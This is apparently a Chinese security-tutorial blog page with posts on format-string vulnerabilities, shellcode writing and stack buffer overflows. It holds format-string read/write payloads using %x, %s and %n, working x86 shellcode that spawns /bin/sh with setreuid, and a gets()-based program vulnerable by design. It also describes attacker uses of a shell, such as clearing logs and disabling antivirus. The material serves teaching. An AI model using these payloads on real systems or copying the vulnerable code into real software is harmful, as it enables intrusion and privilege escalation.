
<p><img src="/Users/brian/Desktop/md/pictures/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%87%BD%E6%95%B0%E7%9A%84%E6%A0%88%E5%B8%83%E5%B1%80.jpg" alt="格式化函数的栈布局"></p>
<p>如果我们给出的格式化字符串和实际的格式化参数不匹配会怎么样？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;a has value %d, b has value %d, c is at address: %08x\n&quot;</span>, a,b);</span><br></pre></td></tr></table></figure>

<p>在这个例子中，格式化字符串需要三个参数，而实际上我们只给出了2个(a &amp; b)。</p>
<p>但是这并不妨碍该程序通过编译。一方面因为 <code>printf()</code> 函数被定义为一个参数长度可变的函数；另一方面，编译器通常不去深入分析 <code>printf()</code> 到底是如何工作的。</p>
<p>那么 <code>printf()</code>能检测到参数不匹配么？</p>
<p><code>printf()</code>从栈上取数据。如果格式化字符串需要3个参数，就去栈上取三个参数。除非栈被标记了有栈边界，否则函数不会知道它已经找遍了提供给他的所有参数。</p>
<p>因为栈上并没有边界标记，所以，<code>printf()</code>会继续从栈上取数据。在不匹配的情况下，它会从不属于这个函数调用的栈的部分取数据。而这会导致一些问题。</p>
<h2 id="格式化字符串漏洞攻击"><a href="#格式化字符串漏洞攻击" class="headerlink" title="格式化字符串漏洞攻击"></a>格式化字符串漏洞攻击</h2><h3 id="使程序崩溃"><a href="#使程序崩溃" class="headerlink" title="使程序崩溃"></a>使程序崩溃</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s%s%s%s%s%s%s%s%s%s&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>对于每个 <code>%s</code> ,<code>printf()</code> 会从栈上取一个数字，把这个数字当做一个地址，用字符串的形式打印指向这个地址的内存中的内容。直到遇到 <code>NULL</code>字符(数字0，而不是字符’0’)。</p>
<p>由于函数所取的数字可能不是一个地址，取到的数字指向的内存也可能不存在（这个地址没有物理内存或者没有被分配），这就会导致程序崩溃。</p>
<p>同样也有可能这个数字指向的地址没问题，但是这个地址空间是被保护的（为内核内存所保留），这种情况下，程序也会崩溃。</p>
<h3 id="查看栈布局"><a href="#查看栈布局" class="headerlink" title="查看栈布局"></a>查看栈布局</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x %08x %08x %08x\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这句代码会从栈上取4个参数，并且将它们用填充为8位的十六进制数展示。输出类似于如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c54f4180 <span class="number">94</span>ee08d0 <span class="number">00000001</span> <span class="number">01f</span>ae274</span><br></pre></td></tr></table></figure>

<h3 id="查看任意位置的内存"><a href="#查看任意位置的内存" class="headerlink" title="查看任意位置的内存"></a>查看任意位置的内存</h3><p>我们需要提供一个内存的地址。但是，我们不能改变代码，我们只能提供格式化字符串。</p>
<p>如果我们在不指定内存地址的情况下使用 <code>printf(%s)</code>，则无论如何都会通过 <code>printf()</code> 函数从堆栈中获取目标地址。函数维护了一个内部栈指针，所以它知道栈中参数的位置。</p>
<p>格式化字符串通常都位于栈上，如果我们在格式化字符串中将目标地址编码，那么目标地址就会存在于栈上。下面这个例子中，格式化字符串存储在某个位于栈上的缓冲区中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="type">char</span> user_input[<span class="number">100</span>]; </span><br><span class="line">... ... <span class="comment">/* other variable definitions and statements */</span> <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, user_input); <span class="comment">/* getting a string from user */</span> <span class="built_in">printf</span>(user_input); <span class="comment">/* Vulnerable place */</span> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们可以强制<code>printf()</code> 获得一个也在栈上的地址，我们就可以控制这个地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\x10\x01\x48\x08 %x %x %x %x %s&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>\x10\x01\x48\x08</code>是四个字节的目标地址。在C语言中，<code>\x10</code>会告诉编译器将一个十六进制的数据 <code>0x10</code>放在当前位置。这个值会占据一个字节。如果没有 <code>\x</code> 直接输入字符串 <code>10</code> ，那么字符<code>1</code> 和 <code>0</code> 的ASCII 49和48会被存储。</p>
<p><code>%x</code> 使得栈指针朝着格式化字符串移动</p>
<p>下图展示了如果 <code>user_input[]</code>包含了如下格式化字符串，攻击是如何进行的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x10\x01\x48\x08 %x %x %x %x %s</span><br></pre></td></tr></table></figure>

<p><img src="/./pictures/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%87%BD%E6%95%B0%E6%94%BB%E5%87%BB%E7%A4%BA%E6%84%8F.jpg" alt="格式化函数攻击示意"></p>
<p>基本上，格式化函数总是在最低位的栈帧中，所以如果我们的缓冲区总是位于栈上，那么它肯定在当前栈指针的上方（缓冲区地址高于当前指针地址）。我们使用4个<code>%x</code> (每个<code>%x</code>会使栈指针向上增加4字节)<strong>使得<code>printf()</code>的指针向高地址移动</strong>-假定栈向低地址方向增长，指向了我们在格式化字符串中存储的地址。</p>
<p>一旦我们到达了目的地址，我们向<code>printf()</code>提供了 <code>%s</code> ，使其打印了在内存地址 <code>0x08480110</code>中的内容。<code>printf()</code> 会把这个内容当作字符串对待，并且打印这个字符串直到字符串结束(NULL byte)。</p>
<p>如果我们用4字节的指针pop(‘%08x’)不能到达准确的格式化字符串边界，我们就需要填充格式化字符串，一个，两个或者三个垃圾字符。</p>
<p>在 <code>user_input[]</code> 和 <code>0x08480110</code> 之间的栈空间并不属于 <code>printf()</code>（实际上我们并不知道这段空间有多大，这里只是示例为4）。但是，由于格式化字符串漏洞，<code>printf() </code>会把它们当作参数来匹配格式化字符串中的 <code>%x</code> 。</p>
<p>因此我们可以想到，关键是找到这段空间的精确距离。这段距离取决于你在<code>%s</code>之前插入了多少的 <code>%x</code>。</p>
<h3 id="在进程内存几乎任何地址写入一个整形数"><a href="#在进程内存几乎任何地址写入一个整形数" class="headerlink" title="在进程内存几乎任何地址写入一个整形数"></a>在进程内存几乎任何地址写入一个整形数</h3><p><code>%n</code> 到目前为止写入的字符数存储在相应参数指示的整数中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;12345%n&quot;</span>, &amp;i);</span><br></pre></td></tr></table></figure>

<p>此时 i &#x3D; 5.</p>
<p>使用上文提到的查看任意位置内存的方法，我们可以在任意位置写入一个数字，只需要将 <code>%s</code> 替换为 <code>%n</code> ，之后内存 <code>0x08480110</code>  的内容就会被覆盖。</p>
<p>通过这个方法，攻击者可以：</p>
<ol>
<li>覆写重要程序的控制访问权限的标志位</li>
<li>覆盖栈上的返回地址，函数指针等等</li>
</ol>
<p>然而，写入的值取决于在<code>%n</code> 之前打印的字符数量。真的可能写入任意的整形数么？</p>
<ol>
<li>使用垃圾字符填充，为了写入1000，可以简单的填充1000个垃圾字符</li>
<li>为了避免格式化字符串过长，我们可以使用格式化参数中的指示宽度的参数。例如<code>%nu</code> -<code>%150u%n</code> 会控制写入的整形数为150。</li>
</ol>
<h3 id="直接的参数访问"><a href="#直接的参数访问" class="headerlink" title="直接的参数访问"></a>直接的参数访问</h3><p>通过 <code>$</code> 修饰符来进行直接参数访问</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%6$d\n&quot;</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>打印 ‘1’，因为<code>6$</code>指定了栈上的第六个参数。</p>
<h3 id="反制措施"><a href="#反制措施" class="headerlink" title="反制措施"></a>反制措施</h3><p>地址随机化：如同克制缓冲区溢出攻击一样，地址随机化使的攻击者很难找到他们想要读或写的地址。</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><img src="/./pictures/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%82%E6%95%B0.jpg" alt="1"></p>
<p><a target="_blank" rel="noopener" href="https://kevinalmansa.github.io/application%20security/Format-Strings/">introduction of Format Strings</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/06/22/Format%20String%20Vulnerailites/" data-id="cl6x1oijf000i6mgq0xxcgwr5" data-title="格式化字符串漏洞" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag">格式化字符串漏洞</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-BO9-shellcode" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/11/BO9-shellcode/" class="article-date">
  <time class="dt-published" datetime="2021-10-10T16:00:00.000Z" itemprop="datePublished">2021-10-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/11/BO9-shellcode/">shell code</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Shellcode-The-Payload"><a href="#Shellcode-The-Payload" class="headerlink" title="Shellcode:The Payload"></a>Shellcode:The Payload</h1><h2 id="SHELLCODE"><a href="#SHELLCODE" class="headerlink" title="SHELLCODE"></a>SHELLCODE</h2><p>​		为了直接在堆栈或内存的其他部分执行我们处理二进制的原始漏洞利用代码，我们需要表示目标机器的一组原始机器指令的汇编代码。 shellcode 是一种汇编语言程序，它执行一个 shell，例如 Unix&#x2F;Linuxshell 的“&#x2F;bin&#x2F;sh”，或 DOS 和 MicrosoftWindows 上的 command.com shell。 在 <a target="_blank" rel="noopener" href="https://www.learnshell.org/">learnshell.org</a> 上以交互方式尝试 shell 命令。 请记住，在exploit中，不仅仅是一个普通的shell，我们想要的是root shell或管理员权限（注意：在某些情况下，在Windows中存在具有高于管理员权限的帐户，例如LocalSystem）。 Shellcode 用于生成（root）shell，因为它会给我们最高权限。 Shellcode 可用作漏洞利用有效载荷，为黑客或攻击者提供对计算机系统的命令行访问。 Shellcode 通常通过利用基于堆栈或堆的缓冲区溢出漏洞或格式字符串攻击来注入计算机内存。 在经典和正常的漏洞利用中，可以通过用注入的 shellcode 的地址覆盖堆栈返回地址来触发 shellcode 执行。 结果，子程序返回给调用者，而是返回到 shellcode，生成一个 shell。 shellcode 的例子可能有以下几种形式：</p>
<p>作为汇编语言 - shellcode.s（shellcode.asm - 适用于 Windows）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#a very simple assembly (AT&amp;T/Linux) program for spawning a shell</span><br><span class="line">.section .data</span><br><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">_start:</span><br><span class="line">         xor %eax, %eax</span><br><span class="line">         mov $70, %al          #setreuid is syscall 70</span><br><span class="line">         xor %ebx, %ebx</span><br><span class="line">         xor %ecx, %ecx</span><br><span class="line">        int $0x80</span><br><span class="line">         jmp ender</span><br><span class="line">         starter:</span><br><span class="line">        popl %ebx             #get the address of the string</span><br><span class="line">         xor  %eax, %eax</span><br><span class="line">         mov  %al, 0x07(%ebx)  #put a NULL where the N is in the string</span><br><span class="line">         movl %ebx, 0x08(%ebx) #put the address of the string</span><br><span class="line">                                #to where the AAAA is</span><br><span class="line">         movl %ebx, 0x0c(%ebx) #put 4 null bytes into where the BBBB is</span><br><span class="line">         mov $11, %al          #execve is syscall 11</span><br><span class="line">         lea 0x08(%ebx), %ecx  #load the address of where the AAAA was</span><br><span class="line">         lea 0x0c(%ebx), %edx  #load the address of the NULLS</span><br><span class="line">         int $0x80             #call the kernel</span><br><span class="line">ender:</span><br><span class="line">         call starter</span><br><span class="line">         .string &quot;/bin/shNAAAABBBB&quot;</span><br></pre></td></tr></table></figure>

<p>As a C program - shellcode.c:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>*argv[ ])</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> *shell[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   shell[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">   shell[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">   execve(shell[<span class="number">0</span>], shell, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请注意，可以使用 <strong>asm</strong> 关键字将汇编代码嵌入到 C 代码中，反之则使用 asm（GCC、Microsoft）。 作为 C 程序中的空终止 C 字符串字符数组：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[ ] = <span class="string">&quot;\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>声明为char类型的C字符串的shellcode可能是漏洞利用代码中使用最广泛的，典型格式如下所示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shcode[ ] = <span class="string">&quot;\x90\x31\x89...&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shcode[ ] = &#123;<span class="number">0x90</span>,<span class="number">0x90</span>,<span class="number">0x31</span>,...&#125;;</span><br></pre></td></tr></table></figure>

<p>在更广泛的定义中，shell 代码不仅可以用于生成 shell，还可以用于创建通用负载。 通常，漏洞利用通常由两个主要部分组成：</p>
<ol>
<li>The exploitation technique.</li>
<li>The payload.</li>
</ol>
<p>漏洞利用部分的目的是转移易受攻击程序的执行路径。 我们可以通过以下技术之一来实现：</p>
<ol>
<li>Stack-based Buffer Overflow.</li>
<li>Heap-based Buffer Overflow.</li>
<li>Integer Overflow.</li>
<li>Format String.</li>
<li>Race condition.</li>
<li>Memory corruption, etc.</li>
</ol>
<p>一旦我们控制了执行路径，我们可能希望它执行我们的代码。 在这种情况下，我们需要在我们的漏洞利用中包含这些代码或指令集。 然后，允许我们执行任意代码的代码部分称为有效载荷(payload)。 有效载荷实际上可以执行计算机程序在易受攻击的程序或服务的适当许可和权利下可以执行的所有操作。</p>
<h2 id="Shellcode-as-a-payload"><a href="#Shellcode-as-a-payload" class="headerlink" title="Shellcode as a payload"></a>Shellcode as a payload</h2><p>当 shell 生成时，它可能是允许攻击者以交互方式探索目标系统的最简单方法。 例如，它可能使攻击者能够发现内部网络，进一步渗透到其他计算机中。 shell 还可以允许上传&#x2F;下载文件&#x2F;数据库，这通常需要作为成功渗透测试 (pen-test) 的证明。 您还可以轻松安装特洛伊木马、键盘记录器、嗅探器、企业蠕虫、WinVNC 等。shell也可用于重新启动易受攻击的服务以保持服务运行。 但更重要的是，重启易受攻击的服务通常会让我们再次攻击该服务。 我们还可以使用 shell 清理日志文件和事件等跟踪信息。 对于 Windows，我们可能会更改注册表以使其在每个系统启动和停止任何防病毒程序时运行。</p>
<p>您还可以创建一个循环并等待攻击者命令的有效负载。 攻击者可以向负载发出命令以创建新连接、上传&#x2F;下载文件或生成另一个 shell。 还有一些其他有效载荷策略，其中有效载荷将循环并等待来自攻击者的额外有效载荷，例如在多阶段攻击和（分布式）拒绝服务 (DDOS&#x2F;DOS) 中。 无论有效载荷是生成 shell 还是循环以等待指令； 它仍然需要与攻击者进行本地或远程通信。 有很多事情可以做。</p>
<h2 id="Shellcode-elements"><a href="#Shellcode-elements" class="headerlink" title="Shellcode elements"></a>Shellcode elements</h2><p>本节将限制对用于利用二进制机器可读程序中基于堆栈的缓冲区溢出的有效负载的讨论。 在这个程序中，shellcode 也必须是机器可读的。 **shellcode 不能包含任何空字节 (0x00)**。 Null (‘\0’) 是一个字符串分隔符，它指示所有 C 字符串函数（和其他类似的实现），一旦找到，将停止处理字符串（以空字符结尾的字符串）。 根据所使用的平台，不仅是 NULL 字节，还有其他定界符，例如换行 (LF-0x0A)、回车 (CR-0x0D)、反斜杠 (\) 和 NOP（无操作）指令，在执行时也必须考虑 创建一个可行的shellcode。 在最好的情况下，shellcode 可能只包含字母数字字符。 幸运的是，有几个称为 <strong>Encoder</strong> 的程序可用于消除 NULL 和其他分隔符。</p>
<p>为了能够生成真正有效的机器代码，您必须以不同的方式编写汇编代码，但仍使其发挥作用。 您需要在这里和那里做一些技巧以产生与最佳机器代码相同的结果。</p>
<p>由于 shellcode 应该尽可能小很重要，shellcode 编写者通常用汇编语言编写代码，然后以十六进制格式提取操作码，最后在程序中将代码用作字符串变量。 可靠的标准库不适用于 shellcode； 我们通常要直接使用操作系统的内核系统调用（system call）。 Shellcode 也依赖于操作系统和架构。 可行的shellcode还必须考虑绕过防火墙和入侵检测系统（IDS）等网络系统保护。</p>
<h2 id="Creating-a-shellcode-Making-the-code-portable"><a href="#Creating-a-shellcode-Making-the-code-portable" class="headerlink" title="Creating a shellcode: Making the code portable"></a>Creating a shellcode: Making the code portable</h2><p>编写 shellcode 与编写普通的汇编代码略有不同，主要是可移植性问题。 由于我们不知道我们在哪个地址，因此无法访问我们的数据，更不可能直接在我们的程序中硬编码内存地址。 我们必须应用一个技巧来制作shellcode，而不必以传统方式引用内存中的参数，通过在内存页面上给出它们的确切地址，这只能在编译时完成。 尽管这是一个显着的缺点，但始终有解决此问题的方法。 最简单的方法是在 shellcode 中使用字符串或数据，如下面的简单示例所示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.section .data</span><br><span class="line">#only use register here...</span><br><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line"> jmp      dummy</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">         #pop register, so we know the string location</span><br><span class="line">        #Here we have assembly instructions which will use the string</span><br><span class="line">dummy:</span><br><span class="line">         call     _start</span><br><span class="line">.string &quot;Simple String&quot;</span><br></pre></td></tr></table></figure>

<p>这段代码中发生的事情是我们跳转到标签 dummy 然后从那里调用 _start 标签。 一旦我们到达 _start 标签，我们就可以弹出一个寄存器，这将使该寄存器包含我们字符串的位置。 使用 CALL 是因为它会自动将返回地址存储在堆栈上。 如前所述，返回地址是 CALL 指令后接下来 4 个字节的地址。 通过在调用后面放置一个变量，我们可以间接地将其地址压入堆栈，而无需知道它。 当我们不知道我们的代码将从哪里执行时，这是一个非常有用的技巧。 使用 C 的代码排列示例可以如下所示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> *name[<span class="number">2</span>];</span><br><span class="line">   name[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">   name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*int execve(char *file, char *argv[], char *env[ ])*/</span></span><br><span class="line">   execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>寄存器示例：</p>
<ol>
<li><strong>EAX</strong>:0xb – syscall number.</li>
<li><strong>EBX</strong>: Address of program name (address of name[0]).</li>
<li><strong>ECX</strong>: Address of null-terminated(空终止) argument-vector, argv (address of name).</li>
<li><strong>EDX</strong>: Address of null-terminated environment-vector, env&#x2F;enp (NULL).</li>
</ol>
<p>在这个程序中，我们需要：</p>
<ol>
<li><p>String&#x2F;bin&#x2F;sh somewhere in memory.</p>
</li>
<li><p>An Address of the string.</p>
</li>
<li><p>String &#x2F;bin&#x2F;sh followed by a NULL somewhere in memory.</p>
</li>
<li><p>An Address of address of string.</p>
</li>
<li><p>NULL somewhere in memory.</p>
<p>内存中某处的字符串&#x2F;bin&#x2F;sh。</p>
<p>字符串的地址。</p>
<p>字符串 &#x2F;bin&#x2F;sh 后跟内存中某处的 NULL。</p>
<p>字符串地址的地址。</p>
<p>内存中某处为 NULL。</p>
</li>
</ol>
<p>为了确定字符串的地址，我们可以使用使用相对寻址的指令。 我们知道 CALL 指令将 EIP 保存在堆栈上并跳转到函数所以</p>
<ol>
<li><p>在shell代码开头使用jmp指令来调用CALL指令。</p>
</li>
<li><p>&#x2F;bin&#x2F;sh 字符串之前的 CALL 指令。</p>
</li>
<li><p>CALL 跳转回跳转后的第一条指令。</p>
</li>
<li><p>现在 &#x2F;bin&#x2F;sh 的地址应该在堆栈上。</p>
</li>
</ol>
<p><img src="https://www.tenouk.com/Bufferoverflowc/Bufferoverflow5_files/image001.png" alt="A trick to determine the address of string"></p>
<p>如果您要编写比生成简单 shell 更复杂的代码，您可以在 CALL 后面放置多个 .string。 在这里，您知道这些字符串的大小，因此一旦您知道第一个字符串的位置，就可以计算它们的相对位置。 有了这些知识，让我们尝试创建一个简单的 shellcode 来生成一个 shell。 这里的要点是创建 shellcode 可以遵循的类似过程和步骤。 以下是一个简单的程序示例，用于在程序集 (AT&amp;T&#x2F;Linux) 中生成 shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#assembly (AT&amp;T/Linux) for spawning a shell</span><br><span class="line">####### testshell2.s ############</span><br><span class="line">.section .data</span><br><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">         xor %eax, %eax           #clear register</span><br><span class="line">         mov $70, %al             #setreuid is syscall 70</span><br><span class="line">         xor %ebx, %ebx           #clear register, empty</span><br><span class="line">         xor %ecx, %ecx           #clear register, empty</span><br><span class="line">        int $0x80                #interrupt 0x80</span><br><span class="line">         jmp ender</span><br><span class="line">starter:</span><br><span class="line">        popl %ebx                #get the address of the string, in %ebx</span><br><span class="line">         xor  %eax, %eax          #clear register</span><br><span class="line">         mov  %al, 0x07(%ebx)     #put a NULL where the N is in the string</span><br><span class="line">         movl %ebx, 0x08(%ebx)    #put the address of the string to where the AAAA is</span><br><span class="line">         movl %eax, 0x0c(%ebx)    #put 4 null bytes into where the BBBB is</span><br><span class="line">         mov $11, %al             #execve is syscall 11</span><br><span class="line">         lea 0x08(%ebx), %ecx     #load the address of where the AAAA was</span><br><span class="line">         lea 0x0c(%ebx), %edx     #load the address of the NULLS</span><br><span class="line">         int $0x80                #call the kernel</span><br><span class="line">ender:</span><br><span class="line">         call starter</span><br><span class="line">       .string &quot;/bin/shNAAAABBBB&quot;#16 bytes of string...</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/11/BO9-shellcode/" data-id="cl6x1oijc000f6mgqe3zj30e2" data-title="shell code" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-BO8-栈缓冲区溢出" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/09/BO8-%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" class="article-date">
  <time class="dt-published" datetime="2021-10-08T16:00:00.000Z" itemprop="datePublished">2021-10-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/09/BO8-%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">栈缓冲区溢出</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="测试用缓冲区溢出代码"><a href="#测试用缓冲区溢出代码" class="headerlink" title="测试用缓冲区溢出代码"></a>测试用缓冲区溢出代码</h1><p>在下面的程序示例中，我们将研究基于堆栈的缓冲区溢出是如何发生的。 我们将使用标准的 C gets() 易受攻击的函数（从标准输入读取并存储在缓冲区中而不进行边界检查）并且溢出将发生在 Test() 函数中。 Test() 函数的缓冲区最多只能容纳 3 个字符加上 NULL，因此 4 个或更多字符应该溢出其缓冲区，我们将尝试演示覆盖保存的 ebp 和 Test() 的返回地址。 测试是在 Linux Fedora Core 3 上完成的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* test buffer program */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> buff[<span class="number">4</span>];</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Some input: &quot;</span>);</span><br><span class="line">   gets(buff);</span><br><span class="line">   <span class="built_in">puts</span>(buff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[ ])</span></span><br><span class="line">&#123;</span><br><span class="line">   Test();</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

